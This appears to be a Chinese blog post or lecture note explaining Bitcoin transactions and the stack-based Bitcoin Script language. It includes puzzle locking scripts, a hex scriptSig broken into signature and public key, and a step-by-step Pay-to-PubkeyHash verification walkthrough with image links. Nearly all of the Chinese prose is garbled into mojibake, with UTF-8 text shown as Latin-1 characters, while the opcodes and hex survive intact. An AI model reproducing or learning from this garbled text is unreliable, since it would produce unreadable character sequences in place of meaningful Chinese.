<p>å…ƒæ•°æ®ï¼šé¡¾åæ€ä¹‰ï¼Œå…ƒæ•°æ®è®°å½•äº¤æ˜“çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚äº¤æ˜“çš„å¤§å°ï¼Œäº¤æ˜“çš„è¾“å…¥ä¸ªæ•°Vin<em>szï¼Œ</em>äº¤æ˜“çš„è¾“å‡ºä¸ªæ•°Voutszï¼Œä»¥åŠæ•´ä¸ªäº¤æ˜“çš„å“ˆå¸Œå€¼ä½œä¸ºäº¤æ˜“çš„å”¯ä¸€çš„IDã€‚å¦‚æœçœ‹çš„ä»”ç»†ï¼Œè¿˜èƒ½å‘ç°æœ‰ä¸€ä¸ªlock_timeï¼Œé”å®šæ—¶é—´ï¼Œåœ¨åé¢ä¼šæœ‰å…·ä½“çš„ä¾‹å­æ¥ä»‹ç»å®ƒçš„ç”¨æ³•ã€‚</p>
<p>è¾“å…¥ï¼šäº¤æ˜“çš„è¾“å…¥æ„æˆä¸€ä¸ªæ•°ç»„ï¼Œå¤šä¸ªè¾“å…¥ä¸­æ¯ä¸€ä¸ªç»“æ„éƒ½ä¸€æ ·ã€‚å› ä¸ºå®ƒæŒ‡å®šäº†ä¹‹å‰çš„ä¸€ä¸ªäº¤æ˜“çš„è¾“å‡ºï¼Œæ‰€ä»¥éœ€è¦åŒ…å«ä¹‹å‰çš„äº¤æ˜“çš„å“ˆå¸Œå€¼ï¼ˆ<strong>å“ˆå¸ŒæŒ‡é’ˆ</strong>ï¼‰ï¼ŒåŒæ—¶æŒ‡å‡ºè¯¥è¾“å…¥æ˜¯ä¹‹å‰äº¤æ˜“çš„ç¬¬å‡ ä¸ªè¾“å‡ºã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæ¯ä¸ªè¾“å…¥è¿˜å¿…é¡»åŒ…æ‹¬ä¸€ä¸ªç­¾åï¼ˆscriptSigï¼‰ï¼Œè¿™ä¸ªç­¾åå°±æ˜¯ä¸€ä¸ªå‡­è¯ï¼Œè¯æ˜äº¤æ˜“çš„åˆ›å»ºè€…ç¡®å®æœ‰ä½¿ç”¨è¿™ä¸ªè¾“å‡ºçš„æƒåˆ©ã€‚</p>
<p>è¾“å‡ºï¼šè¾“å‡ºåŒæ ·æ„æˆä¸€ä¸ªæ•°ç»„ã€‚æ¯ä¸ªè¾“å‡ºæœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼Œvalueå€¼å’ŒscriptPubkeyã€‚æ‰€æœ‰è¾“å‡ºçš„valueçš„å’Œä¸èƒ½å¤§äºæ‰€æœ‰è¾“å…¥å€¼çš„å’Œã€‚å¦‚æœæ‰€æœ‰è¾“å‡ºçš„å’Œå°äºæ‰€æœ‰è¾“å…¥å’Œï¼Œé‚£ä¹ˆå·®å€¼éƒ¨åˆ†å°±æˆä¸ºçŸ¿å·¥çš„äº¤æ˜“è´¹ç”¨ã€‚</p>
<p>ç°åœ¨å¯èƒ½æœ‰ä¸ªç–‘é—®ï¼Œæœ¬æ¥æ˜¯ç­¾åå’Œå…¬é’¥åœ°å€çš„ä½ç½®å‡ºç°çš„æ˜¯scriptSigå’ŒscriptPubKeyï¼Œè€Œä¸æ˜¯ç®€å•çš„Signatureå’ŒPubKeyã€‚è€Œä¸”åœ¨scriptPubkeyçš„åœ°æ–¹ï¼Œæœ‰ä¸€äº›å¥‡æ€ªçš„ç¬¦å·å¦‚OP_DUPï¼ŒOP_Hashç­‰ã€‚è¿™å°±æ˜¯æ¥ä¸‹æ¥è¦ä»‹ç»çš„æ¯”ç‰¹å¸è„šæœ¬ï¼ŒBitcoin scriptã€‚</p>
<p>è¿™é‡Œè¦å¼ºè°ƒä¸€ä¸‹ï¼ŒscriptPubkeyç›¸å½“äºæ˜¯ä¸€æŠŠé”ï¼ˆlockï¼‰ï¼Œäº¤æ˜“Tx1çš„åˆ›å»ºè€…ï¼ˆå¦‚Aliceï¼‰æŒ‡å®šäº†åªæœ‰Bobæ‰èƒ½æ‹¿èµ°äº¤æ˜“Tx1çš„è¾“å‡ºï¼Œé‚£ä¹ˆscriptPubkeyä¸€å®šè¦èƒ½å¤Ÿä¿è¯ç¡®å®æ˜¯Bobæ‰èƒ½ä½¿ç”¨ï¼›è€ŒBobåœ¨åˆ›å»ºäº¤æ˜“Tx2çš„æ—¶å€™ä¹Ÿå¿…é¡»æä¾›é”çš„é’¥åŒ™ï¼Œå°±æ˜¯scriptSigï¼Œè¯æ˜è‡ªå·±ã€‚å½“ç„¶ï¼ŒscriptPubkeyçš„é”å¯èƒ½æ˜¯å„ç§å„æ ·çš„ï¼Œå¯ä»¥æ˜¯ç‰¹å®šèº«ä»½çš„äººï¼›ä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªé—®é¢˜çš„ç­”æ¡ˆï¼Œä¸è®ºæ˜¯è°ï¼Œåªè¦å›ç­”å‡ºæ¥ï¼Œå°±å¯ä»¥æ‹¿èµ°outputã€‚å¯ä»¥çœ‹ä¸‹é¢çš„ä¾‹å­ã€‚</p>
<h2 id="æ¯”ç‰¹å¸è„šæœ¬"><a href="#æ¯”ç‰¹å¸è„šæœ¬" class="headerlink" title="æ¯”ç‰¹å¸è„šæœ¬"></a>æ¯”ç‰¹å¸è„šæœ¬</h2><p>å¦‚ä¸Šå°èŠ‚æ‰€è§ï¼Œåœ¨äº¤æ˜“ä¸­å‡ºç°äº†ä¸€äº›å¦‚OP_DUPçš„ç¬¦å·ï¼Œè¿™å®é™…ä¸Šæ˜¯ä¸€ç§è„šæœ¬ã€‚æœ¬å°èŠ‚å°†ä»‹ç»æ¯”ç‰¹å¸è„šæœ¬è¯­è¨€ï¼Œä»¥åŠä¸ºä½•éœ€è¦ä½¿ç”¨æ¯”ç‰¹å¸è„šæœ¬ã€‚</p>
<p>æ¯”ç‰¹å¸è„šæœ¬æ˜¯åŸºäºæ ˆçš„è¯­è¨€ã€‚æ ˆå…è®¸ä¸¤ç±»æ“ä½œï¼šå…¥æ ˆå’Œå‡ºæ ˆã€‚å…¥æ ˆæ˜¯åœ¨æ ˆé¡¶éƒ¨å¢åŠ ä¸€ä¸ªé¡¹ç›®ï¼Œå‡ºæ ˆåˆ™æ˜¯ä»æ ˆé¡¶éƒ¨ç§»é™¤ä¸€ä¸ªé¡¹ç›®ã€‚è„šæœ¬è¯­è¨€é€šè¿‡ä»å·¦è‡³å³åœ°å¤„ç†æ¯ä¸ªé¡¹ç›®çš„æ–¹å¼æ‰§è¡Œè„šæœ¬ã€‚æ•°å­—æŒ‡ä»¤ç›´æ¥å…¥æ ˆï¼Œæ“ä½œæŒ‡ä»¤å‘å †æ ˆæ¨é€ï¼ˆæˆ–ç§»é™¤ï¼‰ä¸€ä¸ªæˆ–å¤šä¸ªå‚æ•°ï¼Œå¯¹å®ƒä»¬è¿›è¡Œå¤„ç†ï¼Œæˆ–è€…å¯ä»¥å°†ç»“æœå…¥æ ˆã€‚ä¾‹å¦‚ï¼ŒOP_ADDå°†ä»å †æ ˆç§»é™¤ä¸¤ä¸ªé¡¹ç›®ï¼Œå°†äºŒè€…ç›¸åŠ ï¼Œç„¶åå†å°†äºŒè€…ç›¸åŠ ä¹‹å’Œæ¨é€åˆ°å †æ ˆã€‚</p>
<p>è„šæœ¬çš„ä¸€ä¸ªé‡è¦ä½œç”¨å°±æ˜¯åˆ¤æ–­æ˜¯å¦æ»¡è¶³æ¡ä»¶ï¼Œè­¬å¦‚OP_EQUALåˆ¤æ–­æ ˆä¸­çš„ä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰åˆ™å°†æ ˆä¸Šçš„ä¸¤ä¸ªå€¼å‡ºæ ˆï¼Œå…¥æ ˆTRUEã€‚å¦‚æœæœ€åæ ˆçš„ç»“æœä¸ºTRUEï¼Œåˆ™æ¡ä»¶æ»¡è¶³ã€‚ä¸¾ä¸€ä¸ªéå¸¸ç®€å•çš„ä¾‹å­ï¼Œè­¬å¦‚æœ‰é’±ä»»æ€§Aliceå°†è‡ªå·±çš„10ä¸ªå¸å†™åœ¨ä¸€ä¸ªäº¤æ˜“ä¸­ï¼Œç„¶ååŠ çš„é”æ˜¯</p>
<p>3 OP_ADD 5 OP_EQUAL</p>
<p>ä¹‹åå¦‚æœæœ‰äººèƒ½å¤Ÿç»™å‡ºæ»¡è¶³è¿™ä¸ªæ¡ä»¶çš„ç»“æœï¼Œä¹Ÿå³æœ€åçš„OP_EQUALè¿”å›çš„ç»“æœæ˜¯TRUEï¼Œé‚£ä¹ˆåˆ™å¯ä»¥ä½¿ç”¨è¿™10ä¸ªå¸ã€‚åœ¨ä¸Šé¢çš„è¿™ä¸ªé”ä¸­ï¼Œå°±æ²¡æœ‰æŒ‡å®šç‰¹å®šçš„äººæ‰èƒ½ä½¿ç”¨è¿™ä¸ªoutputï¼Œä»»ä½•äººèƒ½å¤Ÿæä¾›é—®é¢˜çš„ç­”æ¡ˆå°±è¡Œã€‚</p>
<p>é‚£ä¹ˆå¤§å®¶çœ‹ä¸€ä¸‹ï¼Œä»¥ä¸Šé—®é¢˜çš„ç»“æœåº”è¯¥æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆæ˜¯2ã€‚</p>
<p>ä»»ä½•ä¸€ä¸ªäººXåœ¨è‡ªå·±æ–°åˆ›å»ºçš„äº¤æ˜“ä¸­çš„scriptSigä¸­ç»™å‡º2è¿™ä¸ªç­”æ¡ˆï¼Œå°±å¯ä»¥ä½¿ç”¨Aliceäº¤æ˜“ä¸­çš„è¾“å‡ºï¼Œä¹Ÿå³æ‹¿èµ°è¿™10ä¸ªå¸ã€‚çœ‹ä¸€ä¸‹çŸ¿å·¥æ‰“åŒ…çš„æ—¶å€™çš„è®¡ç®—è¿‡ç¨‹ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233007.jpg" alt="img"></p>
<p>å†ä¸¾ä¸¤ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">7   OP_ADD   3   OP_SUB   1   OP_ADD    7    OP_EQUAL</span><br></pre></td></tr></table></figure>

<p>å¯¹äºä¸Šé¢çš„scriptPubkeyï¼ŒscriptSigåº”è¯¥æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>ä¸‹é¢çš„ä¾‹å­å‘¢ï¼Ÿ</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">OP_HASH256 6fe28c0ab6f1b372c1a6a246ae63f74f931e8365e15a089c68d6190000000000 OP_EQUAL</span><br></pre></td></tr></table></figure>

<p>æœ€å¸¸è§çš„ä¸€ç§æ¯”ç‰¹å¸äº¤æ˜“åº”è¯¥å°±æ˜¯é€šè¿‡ç­¾åè·å–ä¹‹å‰äº¤æ˜“çš„æ¯”ç‰¹å¸è¾“å‡ºã€‚ä¹Ÿå³è¾“å‡ºä¸­åº”è¯¥æŒ‡æ˜â€œè¿™ä¸€ç¬”è¾“å‡ºåº”è¯¥ç”±è¿™ä¸ªå…¬é’¥å€æ‰€å¯¹åº”çš„ç§é’¥çš„æ‹¥æœ‰è€…ä½¿ç”¨ã€‚â€ä½†æ˜¯å›æƒ³ä¸€ä¸‹ï¼Œæ¯”ç‰¹å¸ä¸­ï¼Œäº¤æ˜“åœ°å€å®é™…ä¸Šæ˜¯å…¬é’¥çš„å“ˆå¸Œï¼Œè€Œä¸æ˜¯çœŸæ­£çš„å…¬é’¥ã€‚å› æ­¤ï¼ŒçŸ¿å·¥å¹¶ä¸çŸ¥é“å…¬é’¥ï¼Œä»è€Œä¹Ÿæ— æ³•æ¥éªŒè¯ç­¾åã€‚ä¸ºäº†è¿›è¡ŒéªŒè¯ï¼Œæ¯ä¸€ä¸ªè¾“å‡ºå®é™…ä¸ŠæŒ‡æ˜çš„æ˜¯â€œè¿™ä¸€ç¬”è¾“å‡ºå¯ä»¥ç”±å“ˆå¸Œä¸ºxçš„å…¬é’¥ï¼Œä»¥åŠå…¬é’¥å¯¹åº”çš„ç§é’¥çš„æ‰€æœ‰è€…ä½¿ç”¨ã€‚â€</p>
<p>ä¸ºäº†è¡¨è¾¾è¿™ä¸ªå«ä¹‰ï¼Œæ¥çœ‹ä¸€ä¸‹äº¤æ˜“ä¸­çš„è¾“å‡ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233008.jpg" alt="img">Pay-to-PubkeyHashè„šæœ¬çš„ä¾‹å­</p>
<p>é¡¾åæ€ä¹‰ï¼ŒOP_DUPæ˜¯duplicateå¤åˆ¶ï¼ŒOPHASH160æ˜¯è¿›è¡Œå“ˆå¸Œï¼Œ69e0â€¦.ä¸²æ˜¯æŒ‡å®šçš„åœ°å€ï¼ŒOP_EQUALVERIFYæ˜¯éªŒè¯æ˜¯å¦ç›¸ç­‰ï¼Œä»¥åŠOP_CHECKSIGæ˜¯è¿›è¡Œç­¾åéªŒè¯ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233009.jpg" alt="img"></p>
<p>é‚£ç°åœ¨çš„é—®é¢˜æ˜¯ï¼Œç¬¬ä¸€ä¸ªOP_DUPæ˜¯ç”¨æ¥å¤åˆ¶ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>ç­”æ¡ˆå°±æ˜¯ï¼Œæ¯ä¸€ä¸ªäº¤æ˜“çš„è¾“å…¥éƒ¨åˆ†çš„scriptSigä¹Ÿæ˜¯è„šæœ¬ã€‚ä¸ºäº†æˆåŠŸåœ°ä½¿ç”¨ä¹‹å‰äº¤æ˜“çš„è¾“å‡ºï¼Œæˆ‘ä»¬éœ€è¦å°†æ–°äº¤æ˜“çš„è¾“å…¥ä¸ä¹‹å‰äº¤æ˜“çš„è¾“å‡ºè¿›è¡Œåˆå¹¶ï¼Œç„¶åæ‰§è¡Œåˆå¹¶ä¹‹åçš„è„šæœ¬ï¼Œå¦‚æœéªŒè¯æˆåŠŸï¼Œåˆ™è¯¥äº¤æ˜“æ˜¯åˆæ³•çš„ï¼›å¦åˆ™ï¼Œè¿™ä¸ªäº¤æ˜“å°±æ˜¯æ— æ•ˆçš„ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233010.jpg" alt="img">æ–°äº¤æ˜“çš„è¾“å…¥ç­¾å+ä¹‹å‰æ‰€å¼•ç”¨äº¤æ˜“çš„è¾“å‡º</p>
<p>æ¯”ç‰¹å¸è„šæœ¬ç®€ç§°å°±æ˜¯Scriptï¼Œå®ƒæ˜¯ä¸€ç§ç®€å•çš„åŸºäºæ ˆçš„ç¼–ç¨‹è¯­è¨€ã€‚åŸºäºæ ˆæ„å‘³ç€æ¯ä¸ªæŒ‡ä»¤ä»¥çº¿æ€§çš„æ–¹å¼ä»…ä»…æ‰§è¡Œä¸€éã€‚ç‰¹åˆ«åœ°ï¼Œæ¯”ç‰¹å¸è„šæœ¬ä¸­æ²¡æœ‰å¾ªç¯ã€‚å› æ­¤ï¼Œè„šæœ¬çš„æŒ‡ä»¤çš„æ•°é‡å°±æš—ç¤ºäº†æ‰§è¡Œè„šæœ¬çš„æ—¶é—´å’Œæ‰€ç”¨çš„å†…å­˜çš„ä¸Šé™ã€‚è¯¥è¯­è¨€ä¸æ˜¯å›¾çµå®Œå¤‡çš„ï¼Œä¹Ÿå³ä¸èƒ½æ‰§è¡Œä»»æ„å¤æ‚çš„æ“ä½œã€‚è¿™ä¹Ÿæ˜¯åˆç†çš„ï¼Œå› ä¸ºçŸ¿å·¥éœ€è¦éªŒè¯äº¤æ˜“ï¼Œä¹Ÿå³çŸ¿å·¥éœ€è¦æ‰§è¡Œè¿™äº›è„šæœ¬ï¼Œå¦‚æœè„šæœ¬ä¸­å‡ºç°äº†æ­»å¾ªç¯ï¼ŒçŸ¿å·¥å°±è¢«å‘äº†ã€‚</p>
<p>äº¤æ˜“çš„æ‰§è¡Œç»“æœè¦ä¹ˆå°±æ˜¯æˆåŠŸçš„ï¼Œä¹Ÿå³äº¤æ˜“æ˜¯åˆæ³•çš„ï¼Œå¯ä»¥è¢«åŒ…æ‹¬åœ¨åŒºå—é“¾ä¸­ï¼›è¦ä¹ˆå°±æ˜¯å¤±è´¥ï¼Œä¹Ÿå³äº¤æ˜“æ˜¯æ— æ•ˆçš„ï¼Œä¸èƒ½è¢«åŒ…æ‹¬åœ¨åŒºå—é“¾ä¸­ã€‚</p>
<p>æ¯”ç‰¹å¸è„šæœ¬è¯­è¨€éå¸¸å°ï¼Œæ€»å…±åªæœ‰256ä¸ªæŒ‡ä»¤ï¼Œå› ä¸ºæ¯ä¸ªæŒ‡ä»¤ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºã€‚å…¶ä¸­ï¼Œæœ‰15ä¸ªæŒ‡ä»¤ç°åœ¨å·²ç»ç¦ç”¨ï¼›75ä¸ªé¢„ç•™çš„ï¼Œæœ‰å¯èƒ½å°†æ¥æ·»åŠ ã€‚å¤§éƒ¨åˆ†çš„æŒ‡ä»¤æ˜¯åœ¨æ™®é€šçš„ç¼–ç¨‹è¯­è¨€ä¸­è§åˆ°çš„ï¼Œæœ‰ä¸€äº›æ˜¯å’Œå¯†ç å­¦ç›¸å…³çš„ï¼Œå¦‚å“ˆå¸Œï¼Œç­¾åéªŒè¯ç­‰ã€‚</p>
<p>ä¸‹é¢ä½¿ç”¨ä¸€ä¸ªä¾‹å­æ¥è®²è¿°å¦‚ä½•è¿è¡Œè„šæœ¬ã€‚</p>
<p>é¦–å…ˆæ¥å…·ä½“çœ‹ä¸€ä¸‹scriptSigçš„æ ·å­ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p>
<p>8c4930460221009e0339f72c793a89e664a8a932df073962a3f84eda0bd9e02084a6a9567f75aa022100bd9cbaca2e5ec195751efdfac164b76250b1e21302e51ca86dd7ebd7020cdc0601410450863ad64a87ae8a2fe83c1af1a8403cb53f53e486d8511dad8a04887e5b23522cd470243453a299fa9e77237716103abc11a1df38855ed6f2ee187e9c582ba6</p>
<p>å®ƒå®é™…ä¸Šæ˜¯ç”±å››ï¼ˆäº”ï¼‰ä¸ªéƒ¨åˆ†æ„æˆï¼š</p>
<p>&lt;One-byte script OPCODE containing the length of the DER-encoded signature plus 1 (the length of the one-byte hash code type)&gt;|&lt; The actual DER-encoded signature plus the one-byte hash code type&gt;|&lt; One-byte script OPCODE containing the length of the public key&gt;|<The actual public key></p>
<p>8cï¼šä¸€ä¸ªå­—èŠ‚æŒ‡ç¤ºæ•´ä¸ªç­¾åï¼ˆscriptSigï¼‰çš„é•¿åº¦ï¼Œå…±140å­—èŠ‚</p>
<p>49ï¼šä¸€ä¸ªå­—èŠ‚æŒ‡ç¤ºå®é™…ç­¾åï¼ˆDER-encodedï¼‰çš„é•¿åº¦ï¼ˆæœ¬ä¾‹ä¸­72ï¼‰åŠ ä¸Šä¸€ä¸ªå­—èŠ‚çš„å“ˆå¸Œç±»å‹SIGHASH_ALLï¼ˆ0x01ï¼‰ï¼Œå…±73å­—èŠ‚ï¼›73&#x3D;72+1</p>
<p>ç­¾åï¼š30460221009e0339f72c793a89e664a8a932df073962a3f84eda0bd9e02084a6a9567f75aa022100bd9cbaca2e5ec195751efdfac164b76250b1e21302e51ca86dd7ebd7020cdc06ï¼ˆ72å­—èŠ‚ï¼‰ï¼Œç„¶åç´§è·Ÿç€01ï¼Œsighashç±»å‹</p>
<p>41ï¼šä¸€ä¸ªå­—èŠ‚æŒ‡ç¤ºå…¬é’¥çš„é•¿åº¦ï¼Œå…±65å­—èŠ‚</p>
<p>å…¬é’¥ï¼š0450863ad64a87ae8a2fe83c1af1a8403cb53f53e486d8511dad8a04887e5b23522cd470243453a299fa9e77237716103abc11a1df38855ed6f2ee187e9c582ba6ï¼ˆ65å­—èŠ‚ï¼‰</p>
<p>ä¹Ÿå³ï¼Œä»æ–°äº¤æ˜“çš„scriptSigä¸­å¯ä»¥è·å¾—å¯¹åº”ç€ä¸‹å›¾ä¸­çš„ç¬¬ä¸€éƒ¨åˆ†å’Œç¬¬äºŒéƒ¨åˆ†ã€‚</p>
<p>ä¸‹å›¾å®é™…ä¸Šæ˜¯ä»å·¦å‘å³é€æ­¥æ‰§è¡Œè„šæœ¬ä¸­æ¯ä¸€ä¸ªæŒ‡ä»¤çš„è¿‡ç¨‹ã€‚ä¸Šéƒ¨æ˜¯æ ˆçš„å˜åŒ–ï¼Œä¸‹éƒ¨åˆ†æ˜¯æ‰§è¡Œçš„å…·ä½“æŒ‡ä»¤ã€‚</p>
<p>sigå’ŒpubKeyæ˜¯ä¸¤æ¡æ•°æ®æŒ‡ä»¤ï¼Œå½“é‡åˆ°æ•°æ®æŒ‡ä»¤æ—¶ï¼Œç›´æ¥å…¥æ ˆï¼›æ‰€ä»¥å°†æ–°äº¤æ˜“çš„è¾“å…¥ä¸­çš„scriptSigéƒ¨åˆ†ä¸­çš„ç­¾åéƒ¨åˆ†å’Œå…¬é’¥éƒ¨åˆ†å…¥æ ˆã€‚åé¢äº”æ¡æŒ‡ä»¤ä¸­é™¤pubKeyHashå¤–éƒ½æ˜¯æ“ä½œæŒ‡ä»¤ï¼ŒåŸºäºæ ˆçš„è¯­è¨€ä»æ ˆé¡¶è·å¾—è¾“å…¥ï¼Œç„¶åå°†ç»“æœå…¥æ ˆã€‚æ‰€ä»¥ç¬¬ä¸€æ¡Dupå¤åˆ¶æŒ‡ä»¤ç›´æ¥æŠŠpubkeyå¤åˆ¶äº†ä¸€ä»½ï¼›Hash160æŒ‡ä»¤å¯¹pubkeyè¿›è¡Œå“ˆå¸Œï¼Œå°†ç»“æœå…¥æ ˆï¼›ç„¶åç„¶åæ¥ä¸‹æ¥æ˜¯æ•°æ®æŒ‡ä»¤å°†æ–°äº¤æ˜“æ‰€å¼•ç”¨çš„äº¤æ˜“çš„è¾“å‡ºä¸­çš„å…¬é’¥å“ˆå¸Œå…¥æ ˆï¼Œç„¶åæ˜¯æ¯”è¾ƒæŒ‡ä»¤ï¼Œæ¯”è¾ƒæ ˆé¡¶çš„ä¸¤ä¸ªå…ƒç´ æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰å¼¹å‡ºï¼Œå¦‚æœä¸ç­‰åˆ™æŠ¥é”™ã€‚æœ€åæ˜¯checksigï¼Œä½¿ç”¨public keyæ¥éªŒè¯ç­¾åã€‚å¦‚æœéªŒè¯æˆåŠŸï¼Œé‚£ä¹ˆæ ˆé¡¶çš„ä¸¤ä¸ªå…ƒç´ å‡ºæ ˆï¼Œç„¶åç»“æœTrueå…¥æ ˆã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233011.jpg" alt="img"></p>
<p>ç°åœ¨æˆ‘ä»¬ç”¨ä¸€ä¸ªä¾‹å­å†è¯¦ç»†åœ°è¿‡ä¸€éè¿™ä¸ªè¿‡ç¨‹ã€‚ä¹‹å‰çš„äº¤æ˜“Tx1ï¼Œä¹Ÿå³æ–°äº¤æ˜“ä¸­çš„è¾“å…¥çš„æ¥æºï¼Œæˆ‘ä»¬å‡è®¾æ˜¯Aliceæ”¯ä»˜ç»™Bobçš„äº¤æ˜“ï¼›æ–°äº¤æ˜“Tx2ï¼Œä¹Ÿå³Bobéœ€è¦ä½¿ç”¨ä»–åœ¨Tx1ä¸­è·å¾—çš„å¸ã€‚</p>
<p>ä¸ºäº†éªŒè¯è¿™ä¸ªäº¤æ˜“çš„åˆæ³•æ€§ï¼ŒçŸ¿å·¥è¦èƒ½å¤ŸéªŒè¯Bobç¡®å®å¯ä»¥ä½¿ç”¨Tx1ä¸­çš„è¾“å‡ºã€‚å¦‚ä½•è¯æ˜å‘¢ï¼Ÿé¦–å…ˆå°±æ˜¯å› ä¸ºAliceåœ¨Tx1äº¤æ˜“ä¸­çš„scriptPubKeyä¸­ï¼Œæ˜ç¡®æŒ‡å®šäº†ä¸€ä¸ªå“ˆå¸Œåœ°å€ï¼Œè¿™ä¸ªå“ˆå¸Œåœ°å€å°±æ˜¯Bobçš„å…¬é’¥çš„å“ˆå¸Œã€‚Bobä¸ºäº†è¯æ˜è‡ªå·±å°±æ˜¯è¿™ç¬”è¾“å‡ºçš„åˆæ³•ä¸»äººï¼Œä»–å¿…é¡»æä¾›èº«ä»½ä¿¡æ¯ï¼Œä¹Ÿå³ï¼Œåœ¨Tx2çš„è¾“å…¥éƒ¨åˆ†çš„scriptSigä¸­ä»–æä¾›äº†ç­¾åå’Œå®Œæ•´çš„å…¬é’¥ï¼Œç­¾åæ˜¯ä½¿ç”¨ç§é’¥å¯¹äº¤æ˜“çš„ç­¾åã€‚</p>
<p>ç„¶åçŸ¿å·¥å¼€å§‹æ‰§è¡ŒéªŒè¯è¿‡ç¨‹ã€‚çŸ¿å·¥å°†Tx2çš„scriptSigéƒ¨åˆ†å’ŒTx1çš„scriptPubKeyéƒ¨åˆ†ç®€å•çš„æ‹¼åœ¨ä¸€èµ·ï¼Œç„¶åæ‰§è¡Œæ¯ä¸€æ¡æŒ‡ä»¤ã€‚</p>
<p>é¦–å…ˆæ˜¯<sig>æŒ‡ä»¤ï¼Œè¿™æ˜¯æ•°æ®æŒ‡ä»¤ï¼Œæ˜¯æ¥è‡ªäºBobçš„ç­¾åï¼Œä¹Ÿå³Tx2çš„ä¸­scriptSigçš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œå…¥æ ˆã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233012.jpg" alt="img"></p>
<p>æ¥ä¸‹æ¥æ˜¯<pubkey>ï¼ŒåŒæ ·æ˜¯æ•°æ®æŒ‡ä»¤ï¼Œæ˜¯æ¥è‡ªäºBobçš„å®Œæ•´å…¬é’¥ï¼Œä¹Ÿå³Tx2çš„ä¸­scriptSigçš„ç¬¬äºŒéƒ¨åˆ†ï¼Œå…¥æ ˆã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233013.jpg" alt="img"></p>
<p>ç¬¬ä¸‰æ¡æŒ‡ä»¤æ˜¯OP_DUPï¼Œè¿™æ˜¯æ¥è‡ªTx1çš„Aliceçš„è¾“å‡ºçš„scriptPubKeyï¼ŒOP_DUPæ·»åŠ åˆ°å †æ ˆï¼Œå› ä¸ºæ˜¯å¤åˆ¶ï¼Œæ‰€ä»¥æŠŠå½“å‰æ ˆé¡¶çš„æ•°æ®å¤åˆ¶ä¸€ä»½æ”¾åˆ°æ ˆé¡¶ï¼Œè¿™æ ·æŠŠBOBæä¾›çš„å…¬é’¥å¤åˆ¶äº†ä¸€ä»½ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233014.jpg" alt="img"></p>
<p>ç¬¬å››ä¸ªæŒ‡ä»¤æ˜¯OP_HASH160ï¼Œå…¥æ ˆï¼Œå¯¹ä¸‹é¢çš„æ•°æ®ï¼Œä¹Ÿå³Bobçš„å…¬é’¥è¿›è¡Œä¸¤æ¬¡å“ˆå¸Œï¼ˆSHA-256ä»¥åŠRIPEMD-160ï¼‰ï¼ŒæŠŠè‡ªå·±æ›¿æ¢æ‰ã€‚è¿™æ ·å°±è·å¾—äº†Bobå…¬é’¥çš„å“ˆå¸Œå€¼ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233015.jpg" alt="img"></p>
<p>ç¬¬äº”æ¡æŒ‡ä»¤æ˜¯æ•°æ®æŒ‡ä»¤ï¼Œ<pubkeyhash>ï¼ŒåŒæ ·æ¥è‡ªäºäº¤æ˜“Tx1ï¼ŒAliceæŒ‡å®šçš„çš„è¾“å‡ºåœ°å€ï¼Œå…¥æ ˆã€‚è¿™æ ·æ ˆé¡¶å°±æœ‰ä¸¤ä»½å“ˆå¸Œå€¼äº†ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233016.jpg" alt="img"></p>
<p>ä¸‹ä¸€æ¡æŒ‡ä»¤ç¨å¾®å¤æ‚ç‚¹ï¼ŒOP_EQUALVERIFYï¼Œå…¥æ ˆï¼Œç›¸å½“äºå±•å¼€æˆEQUALå’ŒVERIFYä¸¤ä¸ªæ“ä½œã€‚EQUALçš„æ“ä½œæ˜¯æ£€æŸ¥å®ƒä¸‹é¢çš„ä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰ï¼Œè¿™é‡Œï¼Œä¹Ÿå³æ£€æŸ¥AliceæŒ‡å®šçš„åœ°å€ï¼ˆæ ˆé¡¶ï¼‰å’ŒBobæä¾›çš„å®Œæ•´å…¬é’¥ç”Ÿæˆçš„å“ˆå¸Œï¼ˆæ ˆé¡¶ç¬¬äºŒä¸ªï¼‰æ˜¯å¦ç›¸ç­‰ã€‚EQUALä¼šå¾—åˆ°0(false)æˆ–è€…1(true)ã€‚VERIFYæ£€æŸ¥EQUALçš„è¿”å›å€¼ï¼Œå¦‚æœæ˜¯falseï¼Œåˆ™äº¤æ˜“éæ³•ï¼Œå¦‚æœæ˜¯trueï¼Œåˆ™å°†è‡ªå·±å’Œtrueå‡ºæ ˆã€‚è¿™é‡Œï¼Œæ˜¯ä¸ºtrueçš„æƒ…å†µã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233017.jpg" alt="img"></p>
